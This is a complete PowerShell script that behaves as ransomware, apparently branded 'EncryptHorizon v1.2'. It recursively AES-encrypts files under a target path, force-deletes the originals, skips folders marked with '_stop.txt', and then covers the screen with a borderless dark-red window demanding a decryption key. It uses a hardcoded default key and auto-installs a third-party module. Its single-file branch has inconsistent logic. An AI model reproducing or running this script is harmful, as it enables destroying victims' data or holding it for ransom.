param (
    [Parameter(Mandatory = $true)]
    [ValidateSet("Encrypt", "Decrypt")]
    [string]$Action,
    [Parameter(Mandatory = $true)]
    [string]$Path,
    [string]$Key = "MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTI="
)

if (-not (Get-Module -ListAvailable -Name DRTools)) {
    Install-Module -Name DRTools -Scope CurrentUser -Force
}

Import-Module DRTools

$redFlagFile = "_stop.txt"

function EncryptOrDecryptFile($filePath, $action, $key) {
    if (Test-Path $filePath -PathType Leaf) {
        if ($action -eq "Encrypt") {
            if ($filePath -like "*$redFlagFile*") {
                return
            } else {
                Invoke-AESEncryption -Path $filePath -Mode Encrypt -Key $key
                Remove-Item $filePath -Force
            }
        } elseif ($action -eq "Decrypt") {
            if ($filePath -like "*.aes") {
                Invoke-AESEncryption -Path $filePath -Mode Decrypt -Key $key
                Remove-Item $filePath -Force
            }
        }
    }
}

function EncryptOrDecryptFolder($folderPath, $action, $key) {
    if (Test-Path $folderPath -PathType Container) {
        $files = Get-ChildItem $folderPath -File
        foreach ($file in $files) {
            if ($file.Name -eq $redFlagFile) {
                return
            } else {
                EncryptOrDecryptFile $file.FullName $action $key
            }
        }
        $subfolders = Get-ChildItem $folderPath -Directory
        foreach ($subfolder in $subfolders) {
            EncryptOrDecryptFolder $subfolder.FullName $action $key
        }
    }
}

if (Test-Path $Path -PathType Leaf) {
    if ($Key -eq "") {
        EncryptOrDecryptFile $Path $Action $Key
    }
} elseif (Test-Path $Path -PathType Container) {
    EncryptOrDecryptFolder $Path $Action $Key
} else {
    Write-Host "The specified path does not exist"
}

if ($Action -eq "Encrypt") {
    Add-Type -AssemblyName System.Windows.Forms
    $form = New-Object System.Windows.Forms.Form
    $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
    $form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
    $form.BackColor = [System.Drawing.Color]::DarkRed
    $form.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen
    $messageLabel = New-Object System.Windows.Forms.Label
    $messageLabel.Text = "EncryptHorizon v1.2`nPlease enter the decryption key:"
    $messageLabel.Font = New-Object System.Drawing.Font("Arial", 24, [System.Drawing.FontStyle]::Bold)
    $messageLabel.ForeColor = [System.Drawing.Color]::White
    $messageLabel.AutoSize = $true
    $messageLabel.Location = New-Object System.Drawing.Point(10, 10)
    $keyTextBox = New-Object System.Windows.Forms.TextBox
    $keyTextBox.Font = New-Object System.Drawing.Font("Arial", 24, [System.Drawing.FontStyle]::Bold)
    $keyTextBox.Width = $form.ClientSize.Width + 200
    $keyTextBox.Height = 50
    $posYbelowMessage = $messageLabel.Location.Y + $messageLabel.Height + 70
    $keyTextBox.Location = New-Object System.Drawing.Point(10, $posYbelowMessage)
    $posYbelowTextBox = $keyTextBox.Location.Y + $keyTextBox.Height + 20
    $decryptButton = New-Object System.Windows.Forms.Button
    $decryptButton.Text = "Decrypt"
    $decryptButton.Font = New-Object System.Drawing.Font("Arial", 24, [System.Drawing.FontStyle]::Bold)
    $decryptButton.ForeColor = [System.Drawing.Color]::White
    $decryptButton.Width = $form.ClientSize.Width - 20
    $decryptButton.Height = 50
    $decryptButton.Location = New-Object System.Drawing.Point(10, $posYbelowTextBox)
    $decryptButton.Add_Click({
        $key = $keyTextBox.Text
        EncryptOrDecryptFolder $Path "Decrypt" $key
        $form.Close()
    })
    $form.Controls.Add($messageLabel)
    $form.Controls.Add($keyTextBox)
    $form.Controls.Add($decryptButton)
    $result = $form.ShowDialog()
    $form.Dispose()
}